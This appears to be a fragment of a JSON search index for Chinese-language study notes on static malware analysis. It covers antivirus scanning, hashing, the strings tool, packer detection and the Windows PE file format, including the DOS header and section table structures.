//\u6240\u9700\u7684\u6700\u5c0f\u9644\u52a0\u6bb5 WORD e_maxalloc; //\u6240\u9700\u7684\u6700\u5927\u9644\u52a0\u6bb5 WORD e_ss; //\u521d\u59cb\u7684SS\u503c\uff08\u76f8\u5bf9\u504f\u79fb\u91cf\uff09 WORD e_sp; //\u521d\u59cb\u7684SP\u503c WORD e_csum; //\u6821\u9a8c\u548c WORD e_ip; //\u521d\u59cb\u7684IP\u503c WORD e_cs; //\u521d\u59cb\u7684CS\u503c\uff08\u76f8\u5bf9\u504f\u79fb\u91cf\uff09 WORD e_lfarlc; //\u91cd\u5206\u914d\u8868\u6587\u4ef6\u5730\u5740 WORD e_ovno; //\u8986\u76d6\u53f7 WORD e_res[4]; //\u4fdd\u7559\u5b57 WORD e_oemid; //OEM\u6807\u8bc6\u7b26\uff08\u76f8\u5bf9e_oeminfo\uff09 WORD e_oeminfo; //OEM\u4fe1\u606f WORD e_res2[10]; //\u4fdd\u7559\u5b57 LONG e_lfanew; //\u65b0exe\u5934\u90e8\u7684\u6587\u4ef6\u4f4d\u7f6e } IMAGE_DOS_HEADER,*PIMAGE_DOS_HEADER; NT\u5934 PE\u6700\u91cd\u8981\u7684\u5934\uff0c\u7531 DOS \u5934\u4e2d\u7684 e_lfanew \u51b3\u5b9a \uff0c\u8868\u793a DOS\u5934\u4e4b\u540e\u7684 NT\u5934\u76f8\u5bf9\u6587\u4ef6\u8d77\u59cb\u5730\u5740\u7684\u504f\u79fb \u5de8\u6076\u5fc3\u7684\u4e00\u5927\u5768\u4e1c\u897f\u3002 \u8fd9\u4e00\u5757\u513f\u6700\u91cd\u8981\u7684\u662f\u5bfc\u5165\u8868\u3001\u5bfc\u51fa\u8868\u3001\u8d44\u6e90\u76ee\u5f55\u7b49\u3002 \u8fd9\u91cc\u65e5\u540e\u7528\u5230\u4e86\u518d\u5199\uff0c\u8fd9\u4e00\u5768\u662f\u771f\u7684\u6076\u5fc3 \u8282\u8868 \u8282\u8868Section Table\u662f\u4e00\u4e2a\u7ed3\u6784\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f\u4e00\u4e2aIMAGE_SECTION_HEADER\u7ed3\u6784\uff0c\u5305\u542b\u4e86\u5bf9\u5e94\u8282\u7684\u5c5e\u6027\u3001\u6587\u4ef6\u504f\u79fb\u91cf\u3001\u865a\u62df\u504f\u79fb\u91cf\u7b49\u3002 typedef struct _IMAGE_SECTION_HEADER { +000h BYTE Name[8]; //\u8282\u540d\u79f0\uff0c\u5982\".text\" union { +008h DWORD PhysicalAddress; // \u7269\u7406\u5730\u5740 +008h DWORD VirtualSize; // \u8282\u957f\u5ea6 } Misc; +00Ch DWORD VirtualAddress; // RVA +010h DWORD SizeOfRawData; // \u5bf9\u9f50\u540e\u7684\u8282\u5c3a\u5bf8 +014h DWORD PointerToRawData; // \u57fa\u4e8e\u6587\u4ef6\u7684\u504f\u79fb +018h DWORD PointerToRelocations; // \u91cd\u5b9a\u4f4d\u7684\u504f\u79fb +01Ch DWORD PointerToLinenumbers; // \u884c\u53f7\u8868\u7684\u504f\u79fb +020h WORD NumberOfRelocations; // \u91cd\u5b9a\u4f4d\u9879\u6570\u76ee +022h WORD NumberOfLinenumbers; // \u884c\u53f7\u8868\u4e2d\u884c\u53f7\u6570\u76ee +024h DWORD Characteristics; // \u8282\u5c5e\u6027 } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; PE \u6587\u4ef6\u7684\u6267\u884c\u987a\u5e8f \u5f53\u4e00\u4e2a PE \u6587\u4ef6 \u88ab\u6267\u884c\u65f6\uff0cPE \u88c5\u8f7d\u5668 \u9996\u5148\u68c0\u67e5 DOS header \u91cc\u7684 PE header \u7684\u504f\u79fb\u91cf\u3002\u5982\u679c\u627e\u5230\uff0c\u5219\u76f4\u63a5\u8df3\u8f6c\u5230 PE header \u7684\u4f4d\u7f6e\u3002 \u5f53 PE\u88c5\u8f7d\u5668 \u8df3\u8f6c\u5230 PE header \u540e\uff0c\u7b2c\u4e8c\u6b65\u8981\u505a\u7684\u5c31\u662f2. \u68c0\u67e5 PE header \u662f\u5426\u6709\u6548\u3002\u5982\u679c\u8be5 PE header \u6709\u6548\uff0c\u5c31\u8df3\u8f6c\u5230 PE header \u7684\u5c3e\u90e8\u3002 \u7d27\u8ddf PE header \u5c3e\u90e8\u7684\u662f\u8282\u8868\u3002PE\u88c5\u8f7d\u5668\u6267\u884c\u5b8c\u7b2c\u4e8c\u6b65\u540e\u5f00\u59cb\u8bfb\u53d6\u8282\u8868\u4e2d\u7684\u8282\u6bb5\u4fe1\u606f\uff0c\u5e76\u91c7\u7528\u6587\u4ef6\u6620\u5c04\uff08 \u5728\u6267\u884c\u4e00\u4e2aPE\u6587\u4ef6\u7684\u65f6\u5019\uff0cWindows\u5e76\u4e0d\u5728\u4e00\u5f00\u59cb\u5c31\u5c06\u6574\u4e2a\u6587\u4ef6\u8bfb\u5165\u5185\u5b58\uff0c\u800c\u662f\u91c7\u7528\u4e0e\u5185\u5b58\u6620\u5c04\u7684\u673a\u5236\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0cWindows\u88c5\u8f7d\u5668\u5728\u88c5\u8f7d\u7684\u65f6\u5019\u4ec5\u4ec5\u5efa\u7acb\u597d\u865a\u62df\u5730\u5740\u548cPE\u6587\u4ef6\u4e4b\u95f4\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u53ea\u6709\u771f\u6b63\u6267\u884c\u5230\u67d0\u4e2a\u5185\u5b58\u9875\u4e2d\u7684\u6307\u4ee4\u6216\u8005\u8bbf\u95ee\u67d0\u4e00\u9875\u4e2d\u7684\u6570\u636e\u65f6\uff0c\u8fd9\u4e2a\u9875\u9762\u624d\u4f1a\u88ab\u4ece\u78c1\u76d8\u63d0\u4ea4\u5230\u7269\u7406\u5185\u5b58\uff0c\u8fd9\u79cd\u673a\u5236\u4f7f\u6587\u4ef6\u88c5\u5165\u7684\u901f\u5ea6\u548c\u6587\u4ef6\u5927\u5c0f\u6ca1\u6709\u592a\u5927\u7684\u5173\u7cfb \uff09\u7684\u65b9\u6cd5\u5c06\u8fd9\u4e9b\u8282\u6bb5\u6620\u5c04\u5230\u5185\u5b58\uff0c\u540c\u65f6\u9644\u4e0a\u8282\u8868\u91cc\u6307\u5b9a\u8282\u6bb5\u7684\u8bfb\u5199\u5c5e\u6027\u3002 PE\u6587\u4ef6\u6620\u5c04\u5165\u5185\u5b58\u540e\uff0cPE\u88c5\u8f7d\u5668\u5c06\u7ee7\u7eed\u5904\u7406PE\u6587\u4ef6\u4e2d\u7c7b\u4f3c import table \uff08\u8f93\u5165\u8868\uff09\u7684\u903b\u8f91\u90e8\u5206\u3002 ref \u535a\u5ba2 \u8fd9\u4e2a\u5f88\u7ec6\uff0c\u5efa\u8bae\u548c\u4e0a\u9762\u90a3\u4e2a\u7ed3\u5408\u770b \u8fd9\u4e2a\u5f88\u6e05\u695a\uff0c\u6709\u7b80\u8981\u7684\u8981\u70b9 Dependency Walker \u662f\u4e2a\u5de5\u5177\uff0c\u63a2\u7d22\u52a8\u6001\u94fe\u63a5\u51fd\u6570\u7684\u3002 \u5e38\u89c1\u7684DLL \u51fd\u6570\u547d\u540d\u7ea6\u5b9a Ex,\u662f\u5fae\u8f6f\u5728\u66f4\u65b0\u65b0\u51fd\u6570\u548c\u65e7\u51fd\u6570\u4e0d\u517c\u5bb9\u65f6\u52a0\u5165\u7684\u4e1c\u897f\u3002 \u800cA\u548cW\u7ed3\u5c3e\u662f\u6307\u63a5\u53d7\u53c2\u6570\u5206\u522b\u662fascii\u548cunicode \u5bfc\u5165\u5bfc\u51fa \u9700\u8981\u81ea\u5df1\u719f\u6089\u4e00\u4e9bwindows\u51fd\u6570 PEview \u5de5\u5177\uff0c\u67e5\u770bPE\u6587\u4ef6\u683c\u5f0f\u7684 Resource Hacker \u5de5\u5177\uff0c\u67e5\u770b\u8d44\u6e90\u8282 \u5176\u4ed6\u5de5\u5177 PEBrowse Professional PE Explorer","title":"ch1"},{"location":"en/MalwareAnalysis/knowledge/ch1/#_1","text":"","title":"\u9759\u6001\u5206\u6790\u6280\u672f\u57fa\u7840"},{"location":"en/MalwareAnalysis/knowledge/ch1/#_2","text":"\u53ef\u4ee5\u7528\u4e00\u4e9b\u5f00\u6e90\u626b\u63cf\u5f15\u64ce\u5148\u626b\u4e00\u4e0b\u75c5\u6bd2","title":"\u53cd\u75c5\u6bd2\u5f15\u64ce"},{"location":"en/MalwareAnalysis/knowledge/ch1/#_3","text":"\u6076\u610f\u4ee3\u7801\u7684\u552f\u4e00\u6807\u8bc6\u3002\u5982\u679c\u5bf9hash\u4e0d\u719f\u6089\uff0c\u8fd9\u91cc\u9700\u8981\u4e00\u4e9b\u5bc6\u7801\u5b66\u7684\u77e5\u8bc6\u3002 \u5de5\u5177\uff1a md5deep","title":"\u54c8\u5e0c\u503c"},{"location":"en/MalwareAnalysis/knowledge/ch1/#_4","text":"\u5de5\u5177\uff1a strings strings\u4f1a\u5ffd\u7565\u4e0a\u4e0b\u6587\u548c\u683c\u5f0f\uff0c\u4ece\u6574\u4e2a\u6587\u4ef6\u4e2d\u68c0\u6d4b\u51fa\u53ef\u6253\u5370\u5b57\u7b26\u4e32\u3002","title":"\u67e5\u627e\u5b57\u7b26\u4e32"},{"location":"en/MalwareAnalysis/knowledge/ch1/#unicode","text":"\u8fd9\u91cc\u9700\u8981\u77e5\u9053unicode\u548cascii\u7684\u533a\u522b","title":"unicode\u7f16\u7801"},{"location":"en/MalwareAnalysis/knowledge/ch1/#_5","text":"\u52a0\u58f3\u7528\u6765\u9632\u6b62\u6076\u610f\u4ee3\u7801\u88ab\u8f7b\u6613\u5206\u6790\u51fa\u6765\u3002 \u52a0\u58f3\u548c\u6df7\u6dc6\u4ee3\u7801\u901a\u5e38\u5305\u542b LoadLibrary \u548c GetProcAddress \u51fd\u6570\uff0c\u7528\u6765\u52a0\u8f7d\u548c\u4f7f\u7528\u5176\u4ed6\u51fd\u6570\u529f\u80fd","title":"\u52a0\u58f3"},{"location":"en/MalwareAnalysis/knowledge/ch1/#_6","text":"\u5de5\u5177\uff1a PEiD 2011\u5e74\u505c\u6b62\u652f\u6301\uff0c\u4e0d\u77e5\u9053\u6709\u6ca1\u6709\u65b0\u7684\u5de5\u5177\u3002","title":"\u68c0\u6d4b"},{"location":"en/MalwareAnalysis/knowledge/ch1/#pe","text":"\u672c\u6bb5\u5185\u5bb9\u7531\u7f51\u7edc\u77e5\u8bc6\u641c\u7d22\u800c\u6210\uff0c\u56e0\u4e3aPE\u6587\u4ef6\u975e\u5e38\u91cd\u8981\uff0c\u4e66\u4e0a\u8fd9\u4e00\u70b9\u8bb2\u5f97\u592a\u5c11\uff01","title":"PE\u6587\u4ef6\u683c\u5f0f"},{"location":"en/MalwareAnalysis/knowledge/ch1/#_7","text":"PE\u6587\u4ef6\u662fWindows\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u4f7f\u7528\u7684\u4e00\u79cd\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u7531COFF\uff08UNIX\u5e73\u53f0\u4e0b\u7684\u901a\u7528\u5bf9\u8c61\u6587\u4ef6\u683c\u5f0f\uff09\u683c\u5f0f\u3002 PE\u662f\u201cPortable Executable File Format\u201d\uff08\u53ef\u79fb\u690d\u7684\u6267\u884c\u4f53\uff09\u7684\u7f29\u5199\u3002 PE\u6587\u4ef6\u662f\u6307 32 \u4f4d\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4e5f\u79f0\u4e3aPE32\u300264\u4f4d\u7684\u53ef\u6267\u884c\u6587\u4ef6\u79f0\u4e3a PE+ \u6216 PE32+\uff0c\u662fPE(PE32)\u7684\u4e00\u79cd\u6269\u5c55\u5f62\u5f0f\uff08\u8bf7\u6ce8\u610f\u4e0d\u662fPE64)\uff0c\u6ca1\u6709\u65b0\u7684\u7ed3\u6784\u52a0\u5165\uff0c\u53ea\u662f\u7b80\u5355\u5730\u5c06\u4ee5\u524d32\u4f4d\u5b57\u6bb5\u6269\u5c55\u621064\u4f4d\u3002\u5bf9\u4e8eC++\u4ee3\u7801\uff0cWindows\u6587\u4ef6\u5934\u7684\u914d\u7f6e\u4f7f\u5176\u62e5\u6709\u4e0d\u660e\u663e\u7684\u533a\u522b\u3002 \u4e8b\u5b9e\u4e0a\uff0c\u4e00\u4e2a\u6587\u4ef6\u662f\u5426\u662f PE \u6587\u4ef6\u4e0e\u5176\u6269\u5c55\u540d\u65e0\u5173\uff0cEXE\u6587\u4ef6\u548cDLL\u6587\u4ef6\u7684\u533a\u522b\u5b8c\u5168\u662f\u8bed\u4e49\u4e0a\u7684\u3002\u5b83\u4eec\u4f7f\u7528\u5b8c\u5168\u76f8\u540c\u7684PE\u683c\u5f0f\uff0c\u552f\u4e00\u7684\u533a\u522b\u5c31\u662f\u7528\u4e00\u4e2a\u5b57\u6bb5\u6807\u8bc6\u51fa\u8fd9\u4e2a\u6587\u4ef6\u662fEXE\u8fd8\u662fDLL\u3002","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"en/MalwareAnalysis/knowledge/ch1/#_8","text":"\u79cd\u7c7b \u4e3b\u6269\u5c55\u540d \u53ef\u6267\u884c\u7cfb\u5217 EXE, SCR \u5e93\u7cfb\u5217 DLL, OCX, CPL, DRV \u9a71\u52a8\u7a0b\u5e8f\u7cfb\u5217 SYS, VXD \u5bf9\u8c61\u6587\u4ef6\u7cfb\u5217 OBJ ### \u57fa\u672c\u5f62\u5f0f PE\u6587\u4ef6\u4f7f\u7528\u7684\u662f\u4e00\u4e2a\u5e73\u9762\u5730\u5740\u7a7a\u95f4\uff0c\u6240\u6709\u4ee3\u7801\u548c\u6570\u636e\u90fd\u88ab\u5408\u5e76\u5728\u4e00\u8d77\uff0c\u7ec4\u6210\u4e00\u4e2a\u5f88\u5927\u7684\u7ed3\u6784\u3002\u6587\u4ef6\u7684\u5185\u5bb9\u88ab\u5206\u5272\u4e3a\u4e0d\u540c\u7684\u533a\u5757\uff08Section\uff0c\u53c8\u79f0\u533a\u6bb5\u3001\u8282\u7b49\uff09\uff0c\u533a\u5757\u4e2d\u5305\u542b\u4ee3\u7801\u6216\u6570\u636e\uff0c\u5404\u4e2a\u533a\u5757\u6309\u9875\u8fb9\u754c\u6765\u5bf9\u9f50\uff0c\u533a\u5757\u6ca1\u6709\u5927\u5c0f\u9650\u5236\uff0c\u662f\u4e00\u4e2a\u8fde\u7eed\u7ed3\u6784\u3002\u6bcf\u4e2a\u5757\u90fd\u6709\u5b83\u81ea\u5df1\u5728\u5185\u5b58\u4e2d\u7684\u4e00\u5957\u5c5e\u6027\uff0c\u6bd4\u5982\uff1a\u8fd9\u4e2a\u5757\u662f\u5426\u5305\u542b\u4ee3\u7801\u3001\u662f\u5426\u53ea\u8bfb\u6216\u53ef\u8bfb/\u5199\u7b49\u3002 ### \u5177\u4f53\u7ed3\u6784 1. DOS\u5934 \u662f\u7528\u6765\u517c\u5bb9 MS-DOS \u64cd\u4f5c\u7cfb\u7edf\u7684\uff0c\u76ee\u7684\u662f\u5f53\u8fd9\u4e2a\u6587\u4ef6\u5728 MS-DOS \u4e0a\u8fd0\u884c\u65f6\u63d0\u793a\u4e00\u6bb5\u6587\u5b57\uff0c\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u662f\uff1aThis program cannot be run in DOS mode. \u8fd8\u6709\u4e00\u4e2a\u76ee\u7684\uff0c\u5c31\u662f\u6307\u660e NT \u5934\u5728\u6587\u4ef6\u4e2d\u7684\u4f4d\u7f6e\u3002 2. NT\u5934 \u5305\u542b windows PE \u6587\u4ef6\u7684\u4e3b\u8981\u4fe1\u606f\uff0c\u5176\u4e2d\u5305\u62ec\u4e00\u4e2a 'PE' \u5b57\u6837\u7684\u7b7e\u540d\uff0cPE\u6587\u4ef6\u5934\uff08IMAGE_FILE_HEADER\uff09\u548c PE\u53ef\u9009\u5934\uff08IMAGE_OPTIONAL_HEADER32\uff09\u3002 3. \u8282\u8868\uff1a\u662f PE \u6587\u4ef6\u540e\u7eed\u8282\u7684\u63cf\u8ff0\uff0cwindows \u6839\u636e\u8282\u8868\u7684\u63cf\u8ff0\u52a0\u8f7d\u6bcf\u4e2a\u8282\u3002 4. \u8282\uff1a\u6bcf\u4e2a\u8282\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u5bb9\u5668\uff0c\u53ef\u4ee5\u5305\u542b \u4ee3\u7801\u3001\u6570\u636e \u7b49\u7b49\uff0c\u6bcf\u4e2a\u8282\u53ef\u4ee5\u6709\u72ec\u7acb\u7684\u5185\u5b58\u6743\u9650\uff0c\u6bd4\u5982\u4ee3\u7801\u8282\u9ed8\u8ba4\u6709\u8bfb/\u6267\u884c\u6743\u9650\uff0c\u8282\u7684\u540d\u5b57\u548c\u6570\u91cf\u53ef\u4ee5\u81ea\u5df1\u5b9a\u4e49\uff0c\u672a\u5fc5\u662f\u4e0a\u56fe\u4e2d\u7684\u4e09\u4e2a\u3002","title":"\u79cd\u7c7b"},{"location":"en/MalwareAnalysis/knowledge/ch1/#rva-va","text":"\u76f8\u5bf9\u865a\u62df\u5730\u5740RVA\u4e0e\u865a\u62df\u5730\u5740VA \u5f53\u4e00\u4e2a PE \u6587\u4ef6\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u4ee5\u540e\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3a \" \u6620\u8c61 \"\uff08image\uff09\uff0c\u4e00\u822c\u6765\u8bf4\uff0cPE\u6587\u4ef6\u5728\u786c\u76d8\u4e0a\u548c\u5728\u5185\u5b58\u91cc\u662f\u4e0d\u5b8c\u5168\u4e00\u6837\u7684\uff0c\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4ee5\u540e\u5176\u5360\u7528\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u8981\u6bd4\u5728\u786c\u76d8\u4e0a\u5360\u7528\u7684\u7a7a\u95f4\u5927\u4e00\u4e9b\uff0c\u8fd9\u662f\u56e0\u4e3a\u5404\u4e2a\u8282\u5728\u786c\u76d8\u4e0a\u662f\u8fde\u7eed\u7684\uff0c\u800c\u5728\u5185\u5b58\u4e2d\u662f\u6309\u9875\u5bf9\u9f50\u7684\uff0c\u6240\u4ee5\u52a0\u8f7d\u5230\u5185\u5b58\u4ee5\u540e\u8282\u4e4b\u95f4\u4f1a\u51fa\u73b0\u4e00\u4e9b \u201c\u7a7a\u6d1e\u201d \u3002 \u56e0\u4e3a\u5b58\u5728\u8fd9\u79cd\u5bf9\u9f50\uff0c\u6240\u4ee5\u5728 PE \u7ed3\u6784\u5185\u90e8\uff0c\u8868\u793a\u67d0\u4e2a\u4f4d\u7f6e\u7684\u5730\u5740\u91c7\u7528\u4e86\u4e24\u79cd\u65b9\u5f0f\uff1a \u9488\u5bf9\u5728\u786c\u76d8\u4e0a\u5b58\u50a8\u6587\u4ef6\u4e2d\u7684\u5730\u5740\uff0c\u79f0\u4e3a \u539f\u59cb\u5b58\u50a8\u5730\u5740 \u6216 \u7269\u7406\u5730\u5740\uff0c\u8868\u793a \u8ddd\u79bb\u6587\u4ef6\u5934\u7684\u504f\u79fb\u3002 \u9488\u5bf9\u52a0\u8f7d\u5230\u5185\u5b58\u4ee5\u540e\u6620\u8c61\u4e2d\u7684\u5730\u5740\uff0c\u79f0\u4e3a \u76f8\u5bf9\u865a\u62df\u5730\u5740\uff08RVA\uff09\uff0c\u8868\u793a\u76f8\u5bf9\u5185\u5b58\u6620\u8c61\u5934\u7684\u504f\u79fb\u3002 \u8fd9\u91cc\u9700\u8981\u77e5\u9053\u7684\u662fRVA=VA-ImageBase","title":"RVA VA"},{"location":"en/MalwareAnalysis/knowledge/ch1/#_9","text":"","title":"\u7ed3\u6784"},{"location":"en/MalwareAnalysis/knowledge/ch1/#dos","text":"\u7531MZ\u5934\u548cDOS\u5b58\u6839\u7ec4\u6210 MZ \u5934\u90e8\u662f\u771f\u6b63\u7684DOS\u5934\u90e8\uff0c\u7531\u4e8e\u5176\u5f00\u59cb\u5904\u7684\u4e24\u4e2a\u5b57\u8282\u4e3a\u201cMZ\u201d\uff0c\u56e0\u6b64DOS\u5934\u4e5f\u53ef\u4ee5\u53eb\u4f5cMZ\u5934\u3002\u8be5\u90e8\u5206\u7528\u4e8e\u7a0b\u5e8f\u5728DOS\u7cfb\u7edf\u4e0b\u52a0\u8f7d\uff0c\u5b83\u7684\u7ed3\u6784\u88ab\u5b9a\u4e49\u4e3aIMAGE_DOS_HEADER\u3002 \u5176\u4e2d\uff0c\u503c\u5f97\u6ce8\u610f\u7684\u662fe_magic\u5b57\u6bb5\u548ce_lfanew\u5b57\u6bb5 e_magic\u5b57\u6bb5\u5360\u4e24\u4e2a\u5b57\u8282\uff0c\u503c\u4e3a 0x5A4D \uff0c\u5bf9\u5e94ASCII\u7801\u503c\u4e3a 'MZ' \uff0c\"MZ\"\u5176\u5b9e\u662fMS-DOS\u7684\u521b\u5efa\u8005\u4e4b\u4e00Mark Zbikowski\u540d\u5b57\u7684\u7f29\u5199\u3002 e_lfanew\u5b57\u6bb5\u53604\u4e2a\u5b57\u8282\uff0c\u4f4d\u4e8e\u4ece\u6587\u4ef6\u5f00\u59cb\u504f\u79fb 3Ch \u5b57\u8282\u5904\uff0c\u7528\u4e8e\u6307\u51faNT\u5934\u7684\u504f\u79fb\u5730\u5740 typedef struct _IMAGE_DOS_HEADER { WORD e_magic; //\u9b54\u672f\u6570\u5b57 WORD e_cblp; //\u6587\u4ef6\u6700\u540e\u9875\u7684\u5b57\u8282\u6570 WORD e_cp; //\u6587\u4ef6\u9875\u6570 WORD e_crlc; //\u91cd\u5b9a\u4e49\u5143\u7d20\u4e2a\u6570 WORD e_cparhdr; //\u5934\u90e8\u5c3a\u5bf8\uff0c\u4ee5\u6bb5\u843d\u4e3a\u5355\u4f4d WORD e_minalloc; //\u6240\u9700\u7684\u6700\u5c0f\u9644\u52a0\u6bb5 WORD e_maxalloc; //\u6240\u9700\u7684\u6700\u5927\u9644\u52a0\u6bb5 WORD e_ss; //\u521d\u59cb\u7684SS\u503c\uff08\u76f8\u5bf9\u504f\u79fb\u91cf\uff09 WORD e_sp; //\u521d\u59cb\u7684SP\u503c WORD e_csum; //\u6821\u9a8c\u548c WORD e_ip; //\u521d\u59cb\u7684IP\u503c WORD e_cs; //\u521d\u59cb\u7684CS\u503c\uff08\u76f8\u5bf9\u504f\u79fb\u91cf\uff09 WORD e_lfarlc; //\u91cd\u5206\u914d\u8868\u6587\u4ef6\u5730\u5740 WORD e_ovno; //\u8986\u76d6\u53f7 WORD e_res[4]; //\u4fdd\u7559\u5b57 WORD e_oemid; //OEM\u6807\u8bc6\u7b26\uff08\u76f8\u5bf9e_oeminfo\uff09 WORD e_oeminfo; //OEM\u4fe1\u606f WORD e_res2[10]; //\u4fdd\u7559\u5b57 LONG e_lfanew; //\u65b0exe\u5934\u90e8\u7684\u6587\u4ef6\u4f4d\u7f6e } IMAGE_DOS_HEADER,*PIMAGE_DOS_HEADER;","title":"DOS\u5934"},{"location":"en/MalwareAnalysis/knowledge/ch1/#nt","text":"PE\u6700\u91cd\u8981\u7684\u5934\uff0c\u7531 DOS \u5934\u4e2d\u7684 e_lfanew \u51b3\u5b9a \uff0c\u8868\u793a DOS\u5934\u4e4b\u540e\u7684 NT\u5934\u76f8\u5bf9\u6587\u4ef6\u8d77\u59cb\u5730\u5740\u7684\u504f\u79fb \u5de8\u6076\u5fc3\u7684\u4e00\u5927\u5768\u4e1c\u897f\u3002 \u8fd9\u4e00\u5757\u513f\u6700\u91cd\u8981\u7684\u662f\u5bfc\u5165\u8868\u3001\u5bfc\u51fa\u8868\u3001\u8d44\u6e90\u76ee\u5f55\u7b49\u3002 \u8fd9\u91cc\u65e5\u540e\u7528\u5230\u4e86\u518d\u5199\uff0c\u8fd9\u4e00\u5768\u662f\u771f\u7684\u6076\u5fc3","title":"NT\u5934"},{"location":"en/MalwareAnalysis/knowledge/ch1/#_10","text":"\u8282\u8868Section Table\u662f\u4e00\u4e2a\u7ed3\u6784\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f\u4e00\u4e2aIMAGE_SECTION_HEADER\u7ed3\u6784\uff0c\u5305\u542b\u4e86\u5bf9\u5e94\u8282\u7684\u5c5e\u6027\u3001\u6587\u4ef6\u504f\u79fb\u91cf\u3001\u865a\u62df\u504f\u79fb\u91cf\u7b49\u3002 typedef struct _IMAGE_SECTION_HEADER { +000h BYTE Name[8]; //\u8282\u540d\u79f0\uff0c\u5982\".text\" union { +008h DWORD PhysicalAddress; // \u7269\u7406\u5730\u5740 +008h DWORD VirtualSize; // \u8282\u957f\u5ea6 } Misc; +00Ch DWORD VirtualAddress; // RVA +010h DWORD SizeOfRawData; // \u5bf9\u9f50\u540e\u7684\u8282\u5c3a\u5bf8 +014h DWORD PointerToRawData; // \u57fa\u4e8e\u6587\u4ef6\u7684\u504f\u79fb +018h DWORD PointerToRelocations; // \u91cd\u5b9a\u4f4d\u7684\u504f\u79fb +01Ch DWORD PointerToLinenumbers; // \u884c\u53f7\u8868\u7684\u504f\u79fb +020h WORD NumberOfRelocations; // \u91cd\u5b9a\u4f4d\u9879\u6570\u76ee +022h WORD NumberOfLinenumbers; // \u884c\u53f7\u8868\u4e2d\u884c\u53f7\u6570\u76ee +024h DWORD Characteristics; // \u8282\u5c5e\u6027 } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;","title":"\u8282\u8868"},{"location":"en/MalwareAnalysis/knowledge/ch1/#pe_1","text":"\u5f53\u4e00\u4e2a PE \u6587\u4ef6 \u88ab\u6267\u884c\u65f6\uff0cPE \u88c5\u8f7d\u5668 \u9996\u5148\u68c0\u67e5 DOS header \u91cc\u7684 PE header \u7684\u504f\u79fb\u91cf\u3002\u5982\u679c\u627e\u5230\uff0c\u5219\u76f4\u63a5\u8df3\u8f6c\u5230 PE header \u7684\u4f4d\u7f6e\u3002 \u5f53 PE\u88c5\u8f7d\u5668 \u8df3\u8f6c\u5230 PE header \u540e\uff0c\u7b2c\u4e8c\u6b65\u8981\u505a\u7684\u5c31\u662f2. \u68c0\u67e5 PE header \u662f\u5426\u6709\u6548\u3002\u5982\u679c\u8be5 PE header \u6709\u6548\uff0c\u5c31\u8df3\u8f6c\u5230 PE header \u7684\u5c3e\u90e8\u3002 \u7d27\u8ddf PE header \u5c3e\u90e8\u7684\u662f\u8282\u8868\u3002PE\u88c5\u8f7d\u5668\u6267\u884c\u5b8c\u7b2c\u4e8c\u6b65\u540e\u5f00\u59cb\u8bfb\u53d6\u8282\u8868\u4e2d\u7684\u8282\u6bb5\u4fe1\u606f\uff0c\u5e76\u91c7\u7528\u6587\u4ef6\u6620\u5c04\uff08 \u5728\u6267\u884c\u4e00\u4e2aPE\u6587\u4ef6\u7684\u65f6\u5019\uff0cWindows\u5e76\u4e0d\u5728\u4e00\u5f00\u59cb\u5c31\u5c06\u6574\u4e2a\u6587\u4ef6\u8bfb\u5165\u5185\u5b58\uff0c\u800c\u662f\u91c7\u7528\u4e0e\u5185\u5b58\u6620\u5c04\u7684\u673a\u5236\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0cWindows\u88c5\u8f7d\u5668\u5728\u88c5\u8f7d\u7684\u65f6\u5019\u4ec5\u4ec5\u5efa\u7acb\u597d\u865a\u62df\u5730\u5740\u548cPE\u6587\u4ef6\u4e4b\u95f4\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u53ea\u6709\u771f\u6b63\u6267\u884c\u5230\u67d0\u4e2a\u5185\u5b58\u9875\u4e2d\u7684\u6307\u4ee4\u6216\u8005\u8bbf\u95ee\u67d0\u4e00\u9875\u4e2d\u7684\u6570\u636e\u65f6\uff0c\u8fd9\u4e2a\u9875\u9762\u624d\u4f1a\u88ab\u4ece\u78c1\u76d8\u63d0\u4ea4\u5230\u7269\u7406\u5185\u5b58\uff0c\u8fd9\u79cd\u673a\u5236\u4f7f\u6587\u4ef6\u88c5\u5165\u7684\u901f\u5ea6\u548c\u6587\u4ef6\u5927\u5c0f\u6ca1\u6709\u592a\u5927\u7684\u5173\u7cfb \uff09\u7684\u65b9\u6cd5\u5c06\u8fd9\u4e9b\u8282\u6bb5\u6620\u5c04\u5230\u5185\u5b58\uff0c\u540c\u65f6\u9644\u4e0a\u8282\u8868\u91cc\u6307\u5b9a\u8282\u6bb5\u7684\u8bfb\u5199\u5c5e\u6027\u3002 PE\u6587\u4ef6\u6620\u5c04\u5165\u5185\u5b58\u540e\uff0cPE\u88c5\u8f7d\u5668\u5c06\u7ee7\u7eed\u5904\u7406PE\u6587\u4ef6\u4e2d\u7c7b\u4f3c import table \uff08\u8f93\u5165\u8868\uff09\u7684\u903b\u8f91\u90e8\u5206\u3002","title":"PE \u6587\u4ef6\u7684\u6267\u884c\u987a\u5e8f"},{"location":"en/MalwareAnalysis/knowledge/ch1/#ref","text":"\u535a\u5ba2 \u8fd9\u4e2a\u5f88\u7ec6\uff0c\u5efa\u8bae\u548c\u4e0a\u9762\u90a3\u4e2a\u7ed3\u5408\u770b \u8fd9\u4e2a\u5f88\u6e05\u695a\uff0c\u6709\u7b80\u8981\u7684\u8981\u70b9","title":"ref"},{"location":"en/MalwareAnalysis/knowledge/ch1/#dependency-walker","text":"\u662f\u4e2a\u5de5\u5177\uff0c\u63a2\u7d22\u52a8\u6001\u94fe\u63a5\u51fd\u6570\u7684\u3002","title":"Dependency 